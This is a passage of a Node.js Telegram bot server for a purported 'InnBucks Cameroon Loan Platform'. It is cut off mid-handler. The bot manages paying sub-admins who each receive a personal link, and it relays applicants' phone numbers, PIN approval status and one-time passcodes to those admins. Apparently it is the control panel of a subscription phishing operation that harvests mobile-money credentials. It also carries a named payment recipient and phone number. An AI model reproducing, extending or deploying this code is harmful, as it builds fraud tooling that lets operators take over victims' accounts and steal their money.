const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

console.log('\n🔧 INITIALIZATION:');
console.log(`   🤖 Bot Token: ${BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
console.log(`   🌐 Webhook URL: ${WEBHOOK_URL}`);
console.log(`   📍 Port: ${PORT}\n`);

// ==========================================
// SUPER ADMINS
// ==========================================
const SUPER_ADMINS = (process.env.SUPER_ADMINS || 'ADMIN001').split(',').map(id => id.trim());

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds    = new Map();
const pausedAdmins    = new Set();
const processingLocks = new Set();
const adminLinkTimers = new Map();

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isSuperAdmin(adminId) {
    return SUPER_ADMINS.includes(adminId);
}

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (isSuperAdmin(adminId)) return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+237'))  return phoneNumber.slice(1);
    if (phoneNumber.startsWith('237'))   return phoneNumber;
    if (!phoneNumber.startsWith('2'))    return '237' + phoneNumber;
    return phoneNumber;
}

// ==========================================
// FIXED sendToAdmin — always resolves chatId
// ==========================================
async function sendToAdmin(adminId, message, options = {}) {
    // 1. Try in-memory map first
    let chatId = adminChatIds.get(adminId);

    // 2. Fall back to DB if not in map
    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (admin?.chatId) {
                chatId = admin.chatId;
                adminChatIds.set(adminId, chatId); // cache it
                console.log(`📋 Loaded chatId from DB for ${adminId}: ${chatId}`);
            }
        } catch (err) {
            console.error(`❌ DB lookup failed for ${adminId}:`, err.message);
        }
    }

    if (!chatId) {
        console.error(`❌ No chatId found for admin: ${adminId}`);
        return null;
    }

    try {
        const result = await bot.sendMessage(chatId, message, options);
        console.log(`✅ Message sent to ${adminId} (chatId: ${chatId})`);
        return result;
    } catch (error) {
        console.error(`❌ Failed to send to ${adminId} (chatId: ${chatId}):`, error.message);
        // If forbidden/blocked, don't crash
        return null;
    }
}

// Start 5-minute countdown for admin link
async function startLinkPaymentTimer(adminId) {
    if (adminLinkTimers.has(adminId)) {
        clearTimeout(adminLinkTimers.get(adminId));
    }

    const timer = setTimeout(async () => {
        try {
            await db.updateAdmin(adminId, { linkLocked: true, linkLockedAt: new Date() });
            adminLinkTimers.delete(adminId);
            console.log(`🔒 Admin link auto-locked after 5 minutes: ${adminId}`);

            const admin = await db.getAdmin(adminId);
            if (admin?.chatId) {
                await bot.sendMessage(admin.chatId, `
🔒 *YOUR LINK HAS BEEN LOCKED*

Your admin link has been automatically locked after 5 minutes.

⏰ To reactivate your link, you must complete payment.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 *PAYMENT DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 **Payment Method:** Mobile Money

**Recipient Name:** Okeyo Bungu
**Phone Number:** 0791336749

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*Steps to Unlock:*
1️⃣ Send money to: *0791336749*
2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
3️⃣ Get the transaction reference code
4️⃣ Send the code in this format:

\`/payment YOUR_TRANSACTION_CODE\`

*Example:*
\`/payment XAF123456\`

Once payment is verified, your link will be immediately unlocked.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error(`❌ Error locking admin link ${adminId}:`, error);
        }
    }, 5 * 60 * 1000);

    adminLinkTimers.set(adminId, timer);
    console.log(`⏱️ 5-minute timer started for admin link: ${adminId}`);
}

function removeLinkPaymentTimer(adminId) {
    if (adminLinkTimers.has(adminId)) {
        clearTimeout(adminLinkTimers.get(adminId));
        adminLinkTimers.delete(adminId);
        console.log(`✅ Timer removed for: ${adminId}`);
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT ERROR HANDLERS
// ==========================================
bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        // Keep-alive ping
        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        // Webhook health check + auto-fix
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        // Monthly billing cycle check
        setInterval(async () => {
            try {
                const now = new Date();
                if (now.getDate() === 1 && now.getHours() === 0 && now.getMinutes() < 2) {
                    console.log('📅 Monthly billing cycle: Suspending all non-super-admin links...');
                    const allAdmins = await db.getAllAdmins();
                    const regularAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));

                    for (const admin of regularAdmins) {
                        try {
                            await db.updateAdmin(admin.adminId, {
                                linkLocked: true,
                                linkLockedAt: new Date(),
                                paymentStatus: 'pending'
                            });
                            if (admin.chatId) {
                                await bot.sendMessage(admin.chatId, `
📅 *MONTHLY SUBSCRIPTION RENEWAL REQUIRED*

Your subscription has expired and your admin link has been suspended.

Send money to *0791336749* (Okeyo Bungu) and submit:
\`/payment YOUR_TRANSACTION_CODE\`
                                `, { parse_mode: 'Markdown' }).catch(() => {});
                            }
                        } catch (err) {
                            console.error(`Failed to suspend ${admin.adminId}:`, err.message);
                        }
                    }
                    console.log(`✅ Suspended ${regularAdmins.length} regular admin(s)`);
                }
            } catch (error) {
                console.error('❌ Error checking monthly subscriptions:', error);
            }
        }, 60 * 1000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
                console.log(`   ✅ Loaded: ${admin.name} (${admin.adminId}) chatId=${admin.chatId}`);
            } else {
                console.log(`   ⚠️ Skipped (no chatId): ${admin.name} (${admin.adminId})`);
            }
        }

        console.log(`\n✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        console.log(`\n/start from chatId: ${chatId}, adminId: ${adminId || 'NONE'}`);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && !isSuperAdmin(adminId)) {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin            = await db.getAdmin(adminId);
                const isSuperAdminUser = isSuperAdmin(adminId);

                let message = `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdminUser ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                if (isSuperAdminUser) {
                    message += `
*Admin Management (Super Admin Only):*
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/clearalladmins - Remove all admins (except SUPER ADMINS)
/admins - List all admins

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request

*Payment Management:*
/pendingpayments - View pending admin payments
/approvepayment <adminId> - Approve payment
/rejectpayment <adminId> - Reject payment
`;
                }
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to InnBucks Cameroon Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps  = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin       = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin.createdAt).toLocaleString()}
${statusEmoji} Status: ${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin (help)
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin John Doe|john@example.com|123456789\`
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const allAdmins       = await db.getAllAdmins();
            const existingNumbers = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber      = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId      = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({
                adminId: newAdminId,
                chatId: newChatId,
                name,
                email,
                status: 'active',
                createdAt: new Date(),
                linkLocked: false,
                linkCreatedAt: new Date(),
                paymentStatus: 'pending',
                paymentSubmittedAt: null,
                payerName: null,
                paidAt: null
            });
            adminChatIds.set(newAdminId, newChatId);
            startLinkPaymentTimer(newAdminId);

            await bot.sendMessage(chatId, `
✅ *NEW ADMIN CREATED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

⏰ 5-minute link timer started

*Has this person already paid?*
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ YES - Already Paid', callback_data: `linkpaid-yes-${newAdminId}` },
                        { text: '❌ NO - Not Paid Yet',  callback_data: `linkpaid-no-${newAdminId}` }
                    ]]
                }
            });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

*Your link is valid for 5 minutes*

/mylink /stats /pending /myinfo
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    // /addadminid ADMINID|NAME|EMAIL|CHATID
    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) {
                return bot.sendMessage(chatId, `❌ Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\``, { parse_mode: 'Markdown' });
            }

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({
                adminId: newAdminId,
                chatId: newChatId,
                name,
                email,
                status: 'active',
                createdAt: new Date(),
                linkLocked: false,
                linkCreatedAt: new Date(),
                paymentStatus: 'pending',
                paymentSubmittedAt: null,
                payerName: null,
                paidAt: null
            });
            adminChatIds.set(newAdminId, newChatId);
            startLinkPaymentTimer(newAdminId);

            await bot.sendMessage(chatId, `
✅ *NEW ADMIN CREATED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

⏰ 5-minute link timer started

*Has this person already paid?*
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ YES - Already Paid', callback_data: `linkpaid-yes-${newAdminId}` },
                        { text: '❌ NO - Not Paid Yet',  callback_data: `linkpaid-no-${newAdminId}` }
                    ]]
                }
            });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

/mylink /stats /pending /myinfo
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them.');
            }
        } catch (error) {
            console.error('❌ Error adding admin with custom ID:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /transferadmin
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) return bot.sendMessage(chatId, `❌ Use: /transferadmin oldChatId | newChatId`);

            const [oldChatIdStr, newChatIdStr] = parts;
            const oldChatId = parseInt(oldChatIdStr);
            const newChatId = parseInt(newChatIdStr);
            if (isNaN(oldChatId) || isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!');

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot transfer a super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found in database!');

            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `🔄 *ADMIN TRANSFERRED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\nOld: \`${oldChatId}\` → New: \`${newChatId}\``, { parse_mode: 'Markdown' });
            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*`, { parse_mode: 'Markdown' }).catch(() => {});
            bot.sendMessage(newChatId, `🎉 *ADMIN ACCESS TRANSFERRED TO YOU*\n\nWelcome ${admin.name}!\nID: \`${targetAdminId}\`\nLink: ${WEBHOOK_URL}?admin=${targetAdminId}`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /pauseadmin
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot pause a super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is already paused.`);

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            await bot.sendMessage(chatId, `🚫 *ADMIN PAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact super admin.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /unpauseadmin
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (!pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is not paused.`);

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            await bot.sendMessage(chatId, `✅ *ADMIN UNPAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /removeadmin
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');

        try {
            const targetAdminId = match[1].trim();
            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot remove a super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);
            removeLinkPaymentTimer(targetAdminId);

            await bot.sendMessage(chatId, `🗑️ *ADMIN REMOVED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            if (admin.chatId) bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        try {
            const allAdmins = await db.getAllAdmins();
            const messages  = [];
            let currentMessage = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSA       = isSuperAdmin(admin.adminId);
                const isPaused   = pausedAdmins.has(admin.adminId);
                const isConn     = adminChatIds.has(admin.adminId);
                const statusEmoji = isSA ? '⭐' : isPaused ? '🚫' : '✅';
                const statusText  = isSA ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
                const connEmoji   = isConn ? '🟢' : '⚪';

                const line = `${index+1}. ${statusEmoji} *${admin.name}*\n   🆔 \`${admin.adminId}\`\n   ${connEmoji} ${statusText}\n${admin.chatId ? `   💬 \`${admin.chatId}\`\n` : ''}\n`;

                if ((currentMessage + line).length > 4000) {
                    messages.push(currentMessage);
                    currentMessage = `👥 *ADMINS (continued)*\n\n` + line;
                } else {
                    currentMessage += line;
                }
            });

            if (currentMessage.length > 0) {
                currentMessage += '\n🟢 = Connected | ⚪ = Not Connected';
                messages.push(currentMessage);
            }

            for (const msg_text of messages) {
                await bot.sendMessage(chatId, msg_text, { parse_mode: 'Markdown' });
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins. Error: ' + error.message);
        }
    });

    // /pendingpayments
    bot.onText(/\/pendingpayments/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can view pending payments.');

        try {
            const allAdmins      = await db.getAllAdmins();
            const pendingPayments = allAdmins.filter(a => a.paymentStatus === 'pending' && a.payerName);

            if (pendingPayments.length === 0) return bot.sendMessage(chatId, '✨ No pending payment approvals!');

            let message = `💰 *PENDING PAYMENT APPROVALS (${pendingPayments.length})*\n\n`;
            for (const admin of pendingPayments) {
                message += `👤 *${admin.name}*\n   🆔 \`${admin.adminId}\`\n   💵 Payer: ${admin.payerName}\n   📅 ${new Date(admin.paymentSubmittedAt).toLocaleString()}\n\n`;
            }
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /approvepayment
    bot.onText(/\/approvepayment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can approve payments.');

        try {
            const targetAdminId = match[1].trim();
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (admin.paymentStatus === 'approved') return bot.sendMessage(chatId, `✅ Payment already approved for ${admin.name}`);

            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { paymentStatus: 'approved', linkLocked: false, paidAt: new Date() });

            await bot.sendMessage(chatId, `✅ *PAYMENT APPROVED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n\nLink is now unlocked!`, { parse_mode: 'Markdown' });
            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `✅ *PAYMENT APPROVED!*\n\nYour link is now active.\n\n🔗 ${WEBHOOK_URL}?admin=${targetAdminId}`, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /rejectpayment
    bot.onText(/\/rejectpayment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can reject payments.');

        try {
            const targetAdminId = match[1].trim();
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

